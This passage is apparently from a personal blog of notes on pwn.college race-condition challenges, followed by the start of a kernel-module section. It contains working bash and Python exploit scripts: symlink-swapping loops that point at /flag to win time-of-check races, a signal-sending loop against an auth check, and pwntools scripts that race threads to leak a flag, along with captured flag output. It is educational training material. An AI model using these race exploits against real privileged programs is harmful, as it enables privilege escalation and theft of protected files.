$1 == 3 ]<br>then<br>    cd<br>    rm a ./b/b<br>    mv b a<br>    ln -s /flag /home/hacker/a/b<br>elif [ $1 == &#x27;cls&#x27; ]<br>then<br>    rm -r a b 2&gt;/dev/null<br>else<br>    echo &#x27;invalid argument&#x27;<br>fi<br></code></pre></div></td></tr></table></figure><p>woc, 我就说怎么不太像竞态条件, 原来.0只是教学, .1都没有getchar()这个函数了.</p><p>重新做一下.</p><figure class="highlight shell"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs shell"><span class="hljs-meta">#</span><span class="bash">!/bin/bash</span><br><br>rm aa bb cc -rf 2&gt;/dev/null<br>mkdir aa<br>touch ./aa/bb<br>ln -s /home /home/hacker/cc<br>ln -s /flag /home/hacker/aa/cc<br><span class="hljs-meta">#</span><span class="bash">sleep 0.0005</span><br>while [ 1 ]<br>do<br>    sleep 0.0005<br>    mv aa bb#change dir name<br>    mv cc aa#let aa-&gt;/home<br>    sleep 0.0005<br>    <br>    mv aa cc #now cc -&gt; /home, bb is dirctory<br>    mv bb aa #restore aa(dir)<br>    mv ./aa/bb ./aa/dd<br>    mv ./aa/cc ./aa/bb #now ./aa has bb-&gt;/flag, dd plainfile<br>    sleep 0.0005<br>    <br>    #restore context, for non-symlink check<br>    mv ./aa/bb ./aa/cc<br>    mv ./aa/dd ./aa/bb<br>done<br></code></pre></div></td></tr></table></figure><figure class="highlight shell"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs shell"><span class="hljs-meta">#</span><span class="bash">!/bin/bash</span><br><span class="hljs-meta">#</span><span class="bash">持续执行challenge的shell</span><br><br>while [[ 1 ]]<br>do<br>    res=$(/challenge/babyrace_level5.1 /home/hacker/aa/bb | grep &#x27;pwn&#x27;)<br>    if [ $res ]<br>    then<br>        printf &quot;\n$res\n\n&quot;<br>        exit<br>    fi<br>done<br></code></pre></div></td></tr></table></figure><p>过不了啊啊啊…</p><h5 id="python大法-key补充"><a href="#python大法-key补充" class="headerlink" title="python大法+key补充"></a>python大法+key补充</h5><ul><li>unlink: delete a name from filesystem. 真是个集合了一堆功能的系统调用, 能删 文件 symlink socket FIFO device.</li><li>一些常数是用os.CONSTANT来调用的.</li><li>如果使用python的builtin function <code>open</code>的话, 会调用fstat ioctl这种没有什么必要的函数. 可以使用os.open来调用低级的函数.</li></ul><p>看视频尝试python写法:</p><figure class="highlight python"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs python"><span class="hljs-keyword">import</span> os,sys,time<br><span class="hljs-keyword">from</span> os <span class="hljs-keyword">import</span> symlink, unlink<br><span class="hljs-keyword">if</span> <span class="hljs-built_in">len</span>(sys.argv) &gt; <span class="hljs-number">1</span>:<br>    <span class="hljs-keyword">if</span> sys.argv[<span class="hljs-number">1</span>] == <span class="hljs-string">&#x27;rm&#x27;</span>:<br>        os.system(<span class="hljs-string">&#x27;rm -r $(ls | egrep -v &quot;*py&quot;)&#x27;</span>)<br>        exit()<br>    <span class="hljs-keyword">elif</span> sys.argv[<span class="hljs-number">1</span>] == <span class="hljs-string">&#x27;init&#x27;</span> :<br>        os.system(<span class="hljs-string">&#x27;rm -r $(ls | egrep -v &quot;*py&quot;)&#x27;</span>)<br>        os.system(<span class="hljs-string">&#x27;./initpy&#x27;</span>)<br>        exit()<br><br><span class="hljs-keyword">while</span> <span class="hljs-literal">True</span>:<br>    time.sleep(<span class="hljs-number">0.0001</span>)<br>    <span class="hljs-comment">#now dir -&gt; 1, need to be unlinked</span><br>    unlink(<span class="hljs-string">&#x27;./dir&#x27;</span>)<br>    symlink(<span class="hljs-string">&#x27;./2&#x27;</span>, <span class="hljs-string">&#x27;./dir&#x27;</span>)<br><br>    <span class="hljs-comment">#now change dir to 3</span><br>    unlink(<span class="hljs-string">&#x27;./dir&#x27;</span>)<br>    symlink(<span class="hljs-string">&#x27;./3&#x27;</span>, <span class="hljs-string">&#x27;./dir&#x27;</span>)<br>    time.sleep(<span class="hljs-number">0.00003</span>)<br>    <br>    <span class="hljs-comment">#now restore context</span><br>    unlink(<span class="hljs-string">&#x27;./dir&#x27;</span>)<br>    symlink(<span class="hljs-string">&#x27;./1&#x27;</span>, <span class="hljs-string">&#x27;./dir&#x27;</span>)<br></code></pre></div></td></tr></table></figure><p>initpy:</p><figure class="highlight shell"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs shell"><span class="hljs-meta">#</span><span class="bash">!/bin/bash</span><br>mkdir -p ./1/aa<br>touch ./1/aa/bb<br><br>mkdir -p ./2<br>ln -s /home ./2/aa #这里还出错过.<br><br>mkdir -p ./3/aa<br>ln -s /flag ./3/aa/bb<br><br>ln -s /home/hacker/1 ./dir<br></code></pre></div></td></tr></table></figure><p>测试:</p><figure class="highlight shell"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs shell">(for i in &#123;1..1000&#125;;do /challenge/babyrace_level5.1 ./dir/aa/bb;done) | egrep &#x27;Error|pwn&#x27; | sort | uniq -c<br></code></pre></div></td></tr></table></figure><p>结果:</p><figure class="highlight shell"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs shell">    356 Error: directory not owned by root!<br>     44 Error: failed to get directory status!<br>    116 Error: failed to get file status!<br>    472 Error: file is a symlink!<br>      3 pwn.college&#123;ojL-wiqjv9XYN-GR2XsuQ-yucpZ.QXwEDNsMTM1IzW&#125;<br>or<br>5218 Error: directory not owned by root!<br>    896 Error: failed to get directory status!<br>   1300 Error: failed to get file status!<br>   2422 Error: file is a symlink!<br>     19 pwn.college&#123;ojL-wiqjv9XYN-GR2XsuQ-yucpZ.QXwEDNsMTM1IzW&#125;<br></code></pre></div></td></tr></table></figure><p>成功率最多就是20/10000, 2‰…….看视频去了, 不知道有没更好的. 太玄学了, 而且这是只是在一个4 core docker里面, 现实机器那不得更多进程+更多cpu内核+奇怪调度算法, 那是我能研究的?直接下一题, cow也是直接上大数量循环. </p><h4 id="level6-5"><a href="#level6-5" class="headerlink" title="level6"></a>level6</h4><p>和上一题相同, 不过dirname之后使用的是lstat, 不follow symlink……</p><p>???????????????????????????????</p><ul><li>首先touch一个/home/hacker/a/home/b文件, 通过name和symlink验证, </li><li>然后ln两个/home/hacker/a -&gt; /, 那么原path的dirname就是指: /home/hacker/a/home</li><li>最后再ln一个/home/hacker/a/home/b -&gt; /flag</li></ul><p>改版:</p><ul><li>首先touch一个/home/hacker/1/a/home/b文件, 通过name和symlink验证, </li><li>然后ln个/home/hacker/2/a -&gt; /, 那么原path的dirname就是指: /home/hacker/2(dir)/a/home</li><li>最后再ln一个/home/hacker/3(dir)/a/home/b -&gt; /flag</li></ul><figure class="highlight shell"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs shell"><span class="hljs-meta">#</span><span class="bash">!/bin/bash</span><br><br>if [ $1 == &#x27;init&#x27; ]<br>then<br>    cd<br>    mkdir -p a/home<br>    touch a/home/b<br>elif [ $1 == 2 ]<br>then<br>    cd<br>    mv a b<br>    ln -s / /home/hacker/a<br>elif [ $1 == 3 ]<br>then<br>    cd<br>    rm a ./b/home/b<br>    mv b a<br>    ln -s /flag /home/hacker/a/home/b<br>elif [ $1 == &#x27;cls&#x27; ]<br>then<br>    rm -r a b 2&gt;/dev/null<br>else<br>    echo &#x27;invalid argument&#x27;<br>fi<br></code></pre></div></td></tr></table></figure><h5 id="python"><a href="#python" class="headerlink" title="python:"></a>python:</h5><p>unlink symlink只要0.000035s就可以完成系统调用.</p><figure class="highlight python"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs python"><span class="hljs-keyword">import</span> os,sys,time<br><span class="hljs-keyword">from</span> os <span class="hljs-keyword">import</span> symlink, unlink<br><span class="hljs-keyword">if</span> <span class="hljs-built_in">len</span>(sys.argv) &gt; <span class="hljs-number">1</span>:<br>    <span class="hljs-keyword">if</span> sys.argv[<span class="hljs-number">1</span>] == <span class="hljs-string">&#x27;rm&#x27;</span>:<br>        os.system(<span class="hljs-string">&#x27;rm -r $(ls | egrep -v &quot;*py&quot;)&#x27;</span>)<br>        exit()<br>    <span class="hljs-keyword">elif</span> sys.argv[<span class="hljs-number">1</span>] == <span class="hljs-string">&#x27;init&#x27;</span> :<br>        os.system(<span class="hljs-string">&#x27;rm -r $(ls | egrep -v &quot;*py&quot;)&#x27;</span>)<br>        os.system(<span class="hljs-string">&#x27;./initpy&#x27;</span>)<br>        exit()<br><br><span class="hljs-keyword">while</span> <span class="hljs-literal">True</span>:<br>    time.sleep(<span class="hljs-number">0.0001</span>)<br>    <span class="hljs-comment">#now dir -&gt; 1, need to be unlinked</span><br>    unlink(<span class="hljs-string">&#x27;./dir&#x27;</span>)<br>    symlink(<span class="hljs-string">&#x27;./2&#x27;</span>, <span class="hljs-string">&#x27;./dir&#x27;</span>)<br><br>    <span class="hljs-comment">#now change dir to 3</span><br>    unlink(<span class="hljs-string">&#x27;./dir&#x27;</span>)<br>    symlink(<span class="hljs-string">&#x27;./3&#x27;</span>, <span class="hljs-string">&#x27;./dir&#x27;</span>)<br>    time.sleep(<span class="hljs-number">0.00003</span>)<br>    <br>    <span class="hljs-comment">#now restore context</span><br>    unlink(<span class="hljs-string">&#x27;./dir&#x27;</span>)<br>    symlink(<span class="hljs-string">&#x27;./1&#x27;</span>, <span class="hljs-string">&#x27;./dir&#x27;</span>)<br></code></pre></div></td></tr></table></figure><p>initpy:</p><figure class="highlight shell"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs shell"><span class="hljs-meta">#</span><span class="bash">!/bin/bash</span><br>mkdir -p ./1/a/home<br>touch ./1/a/home/b<br><br>mkdir -p ./2<br>ln -s / ./2/a<br><br>mkdir -p ./3/a/home<br>ln -s /flag ./3/a/home/b<br><br>ln -s /home/hacker/1 ./dir<br></code></pre></div></td></tr></table></figure><p><code>./dir/a/home/b</code> </p><p>测试:</p><figure class="highlight shell"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs shell">(for i in &#123;1..20000&#125;;do /challenge/babyrace_level6.1 ./dir/a/home/b;done) \<br>| egrep &#x27;Error|pwn&#x27; | sort | uniq -c<br></code></pre></div></td></tr></table></figure><p>成功率降到了20/20000, 变成千分之一了……..</p><h4 id="level7-4"><a href="#level7-4" class="headerlink" title="level7"></a>level7</h4><p>保护全开. 做不出来, 去看了看<code>.0</code>程序的race point在哪里.</p><p>没看懂. 噢, 我在discord上面看到了提示!!! 才想起来视频里有提到signal, 而且这次也有signal handler.</p><p>一开始还在想这岂不是要等十分钟, 然后突然想起来有系统调用可以给其他进程发送信号.</p><p>而且程序中的timeout_handler也只是执行logout而已. 这样race point就很明显了, 只要一次成功就可以了.</p><figure class="highlight c"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs c">    <span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span> ( !<span class="hljs-built_in">strcmp</span>(s1, <span class="hljs-string">&quot;win_authed&quot;</span>) )<br>    &#123;<br>      <span class="hljs-keyword">if</span> ( privilege_level )<br>      &#123;<br><span class="hljs-comment">//就是这里--------------------------------------------------------</span><br>        <span class="hljs-keyword">if</span> ( privilege_level == <span class="hljs-number">1</span> )<br>          <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;Your privilege level is too low!&quot;</span>);<br>        <span class="hljs-keyword">else</span><br>          win();<br>      &#125;<br>      <span class="hljs-keyword">else</span><br>      &#123;<br>        <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;You are not logged in!&quot;</span>);<br>      &#125;&#125;<br></code></pre></div></td></tr></table></figure><p>有一个kill系统调用, <del>要知道pid参数的话那还是直接用pwntools启动, 不知道python的sendline耗时如何….</del>算了不用了</p><ul><li>总之命令行里启动challenge, 永真循环里echo <code>login</code>和<code>win_authed</code>两条命令, 即<code>login\nwin_authed\n</code>.</li><li>然后命令行永真循环, 不停kill pid 14.</li></ul><p>非常直接, 成功率也是非常的低:</p><figure class="highlight shell"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs shell">while true;do kill -s 14 465;done<br>(while true;do printf &#x27;login\nwin_authed\n&#x27;;done)|/challenge/babyrace_level7.1|grep &#x27;pwn&#x27;<br>ps aux<br></code></pre></div></td></tr></table></figure><h4 id="level8-4"><a href="#level8-4" class="headerlink" title="level8"></a>level8</h4><ul><li>调试可以使用practice mode中的sudo gdb, 或者使用pwntools以非set_uid启动程序.<ul><li><code>info thread</code> + <code>thread [num]</code> </li><li>第一个hit breadpoint的线程会停下来, gdb还会切换到那个线程上.</li></ul></li><li><code>ps auxH</code> 显示线程.</li><li>看了几眼python上的concurrent.futures<ul><li>都在下面了. 主要就是processExecutor, 参数是上限, 形象成一个pool(进程池)可以根据需要使用.</li></ul></li></ul><p><a href="https://akkadia.org/drepper/tls.pdf">ELF Handling For TLS</a> | <a href="https://maskray.me/blog/2021-02-14-all-about-thread-local-storage">哪位神的TLS variable文章</a> | <a href="https://www.cs.cmu.edu/afs/cs/academic/class/15492-f07/www/pthreads.html">看起来不错的教程</a><br>上面是有关程序中使用的fs来定位线程私有变量的原理.</p><p>每个线程有自己的空间, 但是privilege_level是全局的. 使用pwntools开两个连接, 和上一题一样的做法.</p><p>成功率2/10000=0.2‰</p><figure class="highlight python"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs python"><span class="hljs-keyword">import</span> concurrent.futures<br><span class="hljs-keyword">import</span> pwn<br><br>pwn.context.update(encoding=<span class="hljs-string">&#x27;latin&#x27;</span>)<br><br>process = pwn.process(<span class="hljs-string">&#x27;/challenge/babyrace_level8.1&#x27;</span>)<br><br><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">work</span>(<span class="hljs-params">cmd</span>):</span><br>    <span class="hljs-keyword">with</span> pwn.remote(<span class="hljs-string">&#x27;localhost&#x27;</span>, <span class="hljs-number">1337</span>) <span class="hljs-keyword">as</span> remote:<br>        pwn.info(remote.recvline().decode())<br>        remote.send(<span class="hljs-string">f&#x27;<span class="hljs-subst">&#123;cmd&#125;</span> &#x27;</span> * <span class="hljs-number">10000</span>)<br>        pwn.info(remote.clean().decode())<br><br><span class="hljs-keyword">with</span> concurrent.futures.ProcessPoolExecutor(<span class="hljs-number">3</span>) <span class="hljs-keyword">as</span> pool:<br>    future = []<br>    future.append(pool.submit(work, <span class="hljs-string">&#x27;login&#x27;</span>))<br>    future.append(pool.submit(work, <span class="hljs-string">&#x27;logout&#x27;</span>))<br>    future.append(pool.submit(work, <span class="hljs-string">&#x27;win_authed&#x27;</span>))<br>    concurrent.futures.wait(future)<br></code></pre></div></td></tr></table></figure><h4 id="level9-4"><a href="#level9-4" class="headerlink" title="level9"></a>level9</h4><p>看到个新模块<code>psutil</code>. </p><p>执行send_redacted_flag命令时, 向函数栈帧中的的缓冲区写入”REDACTED: “, terminated with null-byte, which is 11bytes long(plus null-byte). Then calling open-&gt;read to read flag into the buffer, right after the previous string’s null-byte.</p><p>if now try to use command <code>receive_message</code> to print out string containing the flag, the function will stop at 11th position, because write() function’s <code>n</code> argment is given by strlen() that evaluating string in global_message.</p><p>so the the procedure is as follows:</p><ul><li><p>In one thread(connection), first send <code>send_redacted_flag</code> command. </p></li><li><p>Between this and next command, another thread send <code>send_message</code> command, overwrite until the global_message’s 11th char, <strong>before assigning null-byte to the end of string</strong>.</p><img src="../../image/pwn-modules/image-20220519155802133.png" alt="image-20220519155802133" style="zoom:80%;" /></li><li><p>and first thread now continue executing at <code>receive_message</code> command. after the strlen() function, the return value means 11+[flag’s len], then used in the argment of write().</p></li></ul><p>how to write script….</p><ul><li>two connections. one sends <code>send_redacted_flag -&gt; receive_message</code> sequence, another sends <code>send_message</code> with <code>&#39;whatthefuckisthat&#39;</code> continuously(or separated by space in a longlonglong bytestring).</li></ul><figure class="highlight python"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs python"><span class="hljs-keyword">import</span> concurrent.futures<br><span class="hljs-keyword">import</span> pwn<br><br>process = pwn.process(<span class="hljs-string">&#x27;./babyrace_level9.1&#x27;</span>)<br><br><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">work</span>(<span class="hljs-params">cmd</span>):</span><br>    <span class="hljs-keyword">with</span> pwn.remote(<span class="hljs-string">&#x27;localhost&#x27;</span>, <span class="hljs-number">1337</span>) <span class="hljs-keyword">as</span> remote:<br>        pwn.info(remote.recvline().decode())<br>        remote.send(<span class="hljs-string">f&#x27;<span class="hljs-subst">&#123;cmd&#125;</span> &#x27;</span> * <span class="hljs-number">10000</span>)<br>        pwn.info(remote.clean().decode())<br><br><span class="hljs-keyword">with</span> concurrent.futures.ProcessPoolExecutor(<span class="hljs-number">3</span>) <span class="hljs-keyword">as</span> pool:<br>    thread = []<br>    thread.append(pool.submit(work, <span class="hljs-string">&#x27;send_redacted_flag receive_message&#x27;</span>))<br>    thread.append(pool.submit(work, <span class="hljs-string">&#x27;send_message whatthefuck&#x27;</span>))<br>    concurrent.futures.wait(thread)<br></code></pre></div></td></tr></table></figure><p>something interesting happen….</p><figure class="highlight shell"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs shell">9999     Message: <br>   1 [*] Message: <br>   1     Message: REDAChED: \isthatandthis\at the fuck? this is true flag&#125;<br>   1     Message: REDAChefuckisthatandthis\at the fuck? this is true flag&#125;<br> 504     Message: REDACTED: [*] Function (send_message/send_redacted_flag/receive_message/quit): <br>5444     Message: REDACTED: \isthatandthis\at the fuck? this is true flag&#125;<br>   1     Message: REDACTefu \isthatandthis\at the fuck? this is true flag&#125;<br>   1     Message: whatCTEfuckisthatandthis\at the fuck? this is true flag&#125;<br>   1     Message: whattheD: \isthatandthis\at the fuck? this is true flag&#125;<br>   1     Message: whatthef: \isthatandthis\at the fuck? this is true flag&#125;<br>  18     Message: whatthefuc[*] Function (send_message/send_redacted_flag/receive_message/quit): <br>   1     Message: whatthefuc\isthatandthis\at the fuck? this is true flag&#125;<br>4027     Message: whatthefuckisthatandthis\at the fuck? this is true flag&#125;<br><br>   1     Message: whatthefuckisn.ctalege&#123;what the fuck? this is true flag&#125;<br></code></pre></div></td></tr></table></figure><p>by patching the program, something strange happened….. how does line 11 occur….? can write syscall to be interrupted and then reenter?</p><p>anyway, that’s the way it is.</p><h4 id="level10-4"><a href="#level10-4" class="headerlink" title="level10"></a>level10</h4><p>global_message with semaphore: sem_wait() + sem_post()……………</p><p>我又不会了…… 做这个真是违反直觉的思考. scp了.0程序, 希望能看出一点提示..没看出来.</p><h4 id="level11-4"><a href="#level11-4" class="headerlink" title="level11"></a>level11</h4><p>没看出和上一题有什么区别. 不过在discord上面看到了一点东西.</p><blockquote><p>10, 11 have semaphores on broadcast, 11 has a printf instead of strlen-read</p></blockquote><p>dicord上面都用的是sigpipe. 这个会调用pthread_exit()函数. </p><p>.0程序停在了message赋值的每一次循环, 这个时候可以发送sigpipe直接结束线程, 这样sem_post不会执行, global_message_mutex也不再可用, 意味着没有线程能够再进入critical section. </p><blockquote><p>Or not consuming input so the writes to the socket block at the right time</p><p>不知道这能不能行. 这只能在send_message停下.</p></blockquote><p>processes are as follows:</p><ul><li>one connection sends <code>send_redacted_flag</code> command, then completes the str copy. </li><li>another or still the same connection sends <code>send_message</code> command with <code>whatthefuckisthis</code>, causing overlapping the null-byte between prompt and flag. after null-byte, before last byte, sending SIGPIPE to stop thread.</li><li>another connection send <code>receive_message</code>.</li><li>every program run can only test once.</li></ul><p>succeeding in .0 practice.</p><h1 id="module-D-kernel"><a href="#module-D-kernel" class="headerlink" title="module D-kernel"></a>module D-kernel</h1><h4 id="key-point"><a href="#key-point" class="headerlink" title="key point:"></a>key point:</h4><h5 id="Intro"><a href="#Intro" class="headerlink" title="Intro:"></a>Intro:</h5><ul><li><a href="https://0xax.gitbooks.io/linux-insides/content/SysCall/linux-syscall-1.html">linux syscall <em>DETAILS</em> (<strong>linux inside</strong>)</a> |  <a href="https://www.kernel.org/doc/html/latest/">linux_kernel_doc</a> | <a href="https://www.felixcloutier.com/x86/syscall">syscall instruction</a> | <a href="https://gcc.gnu.org/onlinedocs/gcc/Variable-Attributes.html">Attributes of Variables(gcc)</a> | <ul><li>you cannot find <em>noderef</em> or <em>address_space</em> in the GCC docs because they are not GCC attributes. They have meaning only for <a href="https://en.wikipedia.org/wiki/Sparse">Sparse</a>.<br>about <a href="https://www.linuxquestions.org/questions/linux-kernel-70/what-does-__attribute__-noderef-address_space-2-mean-4175493101/">the effect</a>.</li></ul></li><li><strong>Modern solution to Rings:</strong> Ring -1, <em>Hypervisor Mode</em>. Able to intercept sensitive Ring 0 actions done by guests and handle them in the host OS.</li><li>syscall High-level overview:<ol><li>At bootup, in Ring 0, the kernel sets MSR_LSTAR to point to the syscall handler routine.</li><li>When a userspace (Ring 3) process wants to interact with the kernel, it car call syscall.<br>a. Privilege level switches to Ring 0.<br>b. Control flow jumps to value of MSR_LSTAR.<br>c.  Return address saved to <strong>rcx</strong>.<br>d. That’s basically it! <a href="https://www.felixcloutier.com/x86/syscall">https://www.felixcloutier.com/x86/syscall</a></li><li>When the kernel is ready to return to userspace, it calls the appropriate return instruction (i.e., <strong>sysret</strong> for syscall).<br> a. Privilege level switches to Ring 3.<br> b. Control flow jumps to rcx.<br> c. That’s basically it!</li><li><code>x86-64: rdi   rsi   rdx   r10   r8    r9    -</code><br>We can see the 6 args are stored in these registers. rcx is used to store syscall return address, so args skip rcx.</li></ol></li><li>exploit dirctions:<ul><li>From the network: remotely-trigged exploits (packets of death, etc). Rare!</li><li>From userspace: vulnerabilities in syscall and ioctl handlers (i.e., launched from inside a <strong>sandbox</strong>!)</li><li>From devices</li></ul></li></ul><h5 id="kernel-module"><a href="#kernel-module" class="headerlink" title="kernel module"></a>kernel module</h5><ul><li><code>lsmod</code> list kernel module. like device drivers(graphic card), filesystems, networking functionality, other stuff.<br>all with <code>.ko</code> extension.</li></ul><p>How to interact with kernel module for further exploitation?</p><ul><li>historically, kernel modules could add syscall entries. nowadays less used.</li><li>interrupts. a module could register a interrupt handler to <strong>hook</strong>. <code>int3</code> and <code>int1</code> are one-byte interrupt instructions which may be useful.</li><li>files. <ul><li><code>/dev</code>: mostly traditional devices (i.e., /dev/dsp for audio)</li></ul><ol start="2"><li><code>/proc</code>: started out in System V Unix as information about running processes. Linux expanded it into in <strong>a disastrous mess of kernel interfaces</strong>.</li></ol><ul><li><code>/sys</code>: non-process information interface with the kernel. </li><li>A module can register a file in one of the above locations.<br>Userspace code can <em>read || open()</em> that file to interact with the module!<br>or <em>ioctl()</em> function sends setting and querying non-stream data(i.e., webcam resolution <strong>settings</strong> as opposed to webcam video <strong>stream</strong>).</li></ul></li></ul><p>driver interaction:</p><ul><li>reads data from userspace (using <code>copy_from_user</code>, a kernel API)</li><li>“does stuff” (open files, read files, interact with hardware, etc)</li><li>writes data to userspace (using copy_to_user)</li><li>returns to userspace</li></ul><p>kernel module:  <a href="https://www.kernel.org/doc/htmldocs/kernel-api/index.html">kernel doc</a> </p><ul><li>compilation:<ul><li>kernel modules are all listed in the <code>pwnkernel/src/</code> </li><li>at the end of the build.sh, there is a <em>building modules</em> procedure. it calls Make makefile in src dirctory then copys <code>.ko</code> file to fs directory being mounted at <code>/home/ctf</code>. </li><li>so before compilation, adding an entry to makefile for newly added module.</li></ul></li><li>command: <u>must be used under root. Or sh not found</u>.<ul><li><code>insmod</code> command: load kernel module. or through <code>init_module</code> system call.</li><li><code>lsmod</code> : list all modules.</li><li><code>rmmod</code> : remove module.</li></ul></li><li>testing module:<ul><li><code>hello_log.ko</code>: just print something to kernel ring buffer.</li><li><code>hello_dev_char.ko</code>: register a character device. may use head, dd(with option like: if=/dev/pwn-college-char of=/proc/self/fd/1 bs=128 count=1) , etc, to read from it.</li><li><code>hello_ioctl</code>: exposes a /dev device with ioctl interface</li><li><code>hello_proc_char</code><strong>:</strong> exposes a /proc device</li><li><code>make_root</code>: exposes a /proc device with ioctl interface and an evil backdoor!</li></ul></li></ul><h5 